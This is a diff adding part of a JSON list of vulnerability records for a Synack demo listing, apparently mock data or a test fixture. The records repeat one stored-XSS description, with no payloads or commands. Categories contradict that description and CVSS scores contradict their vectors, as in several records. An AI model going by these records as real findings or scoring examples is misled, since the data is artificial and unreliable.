+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://login.example.com/alert/lhfrdev",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-18T00:00:00+00:00",
+    "resolved_at": "2022-11-01T12:30:35+00:00",
+    "closed_at": "2022-12-13T12:30:35+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-36"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-24",
+    "title": " #11",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "File Inclusion (No execution)",
+      "parent": "Authorization/Permissions"
+    },
+    "cvss_final": 10.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://www.example.com/products/2bd3h7d",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-18T00:00:00+00:00",
+    "resolved_at": "2023-03-24T12:30:35+00:00",
+    "closed_at": "2023-05-07T12:30:35+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-24"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-35",
+    "title": " #16",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "CSRF Protection Missing",
+      "parent": "Cross-site Request Forgery (CSRF)"
+    },
+    "cvss_final": 2.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:N",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://login.example.com/social/9fozplt",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-17T00:00:00+00:00",
+    "resolved_at": "2023-03-24T12:30:34+00:00",
+    "closed_at": "2023-05-03T12:30:34+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-35"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-47",
+    "title": " #20",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "CSV Injection",
+      "parent": "Content Injection"
+    },
+    "cvss_final": 8.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:L/UI:R/S:C/C:N/I:N/A:L",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://client.example.com/alert/eee3hmn",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-17T00:00:00+00:00",
+    "resolved_at": "2023-10-18T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185994,
+      "text": "Pending Review",
+      "created_at": "2023-10-02T16:18:51.772Z",
+      "flow_position": 0,
+      "flow_type": 0
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-47"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-21",
+    "title": " #9",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Functionality Abuse with Malicious Impact",
+      "parent": "Functional/Business Logic"
+    },
+    "cvss_final": 3.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "High (H)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:H/UI:R/S:C/C:H/I:N/A:L",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://www.example.com/admin/kui5hcn",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-16T00:00:00+00:00",
+    "resolved_at": "2023-04-07T12:30:35+00:00",
+    "closed_at": "2023-05-20T12:30:35+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-21"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-29",
+    "title": " #12",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Cross-Site Websocket Hijacking (CSWSH)",
+      "parent": "Authentication/Session Management"
+    },
+    "cvss_final": 7.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:H/PR:L/UI:R/S:C/C:N/I:L/A:H",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://www.example.com/jp/6s2kl6i",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-09-15T00:00:00+00:00",
+    "resolved_at": "2022-10-20T12:30:35+00:00",
+    "closed_at": "2022-11-29T12:30:35+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-29"
+  }
+]
